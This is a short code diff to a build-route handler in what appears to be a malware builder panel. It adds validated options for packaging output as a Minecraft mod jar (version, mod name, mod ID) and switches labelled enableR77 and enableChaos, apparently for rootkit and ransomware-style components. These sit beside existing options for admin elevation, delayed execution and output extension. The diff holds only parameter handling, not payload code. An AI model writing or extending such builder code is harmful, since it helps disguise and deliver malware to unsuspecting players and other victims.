@@ -70,6 +70,12 @@ export async function handleBuildRoutes(
         typhonVariant,
         enableVault,
         vaultRecipient,
+        enableJar,
+        jarMcVersion,
+        jarModName,
+        jarModId,
+        enableR77,
+        enableChaos,
         requireAdmin,
         outputExtension,
         sleepSeconds,
@@ -258,6 +264,18 @@ export async function handleBuildRoutes(
         vaultRecipient: !!enableVault && typeof vaultRecipient === "string" && vaultRecipient.trim().length > 0
           ? vaultRecipient.trim().slice(0, 512)
           : undefined,
+        enableJar: !!enableJar,
+        jarMcVersion: typeof jarMcVersion === "string" && /^\d+\.\d+(\.\d+)?$/.test(jarMcVersion.trim())
+          ? jarMcVersion.trim()
+          : "1.21.4",
+        jarModName: typeof jarModName === "string" && jarModName.trim().length > 0
+          ? jarModName.trim().slice(0, 64)
+          : undefined,
+        jarModId: typeof jarModId === "string" && /^[a-z0-9_]{1,32}$/.test(jarModId.trim())
+          ? jarModId.trim()
+          : undefined,
+        enableR77: !!enableR77,
+        enableChaos: !!enableChaos,
         requireAdmin: safeRequireAdmin,
         outputExtension: safeOutputExtension,
         sleepSeconds: safeSleepSeconds,
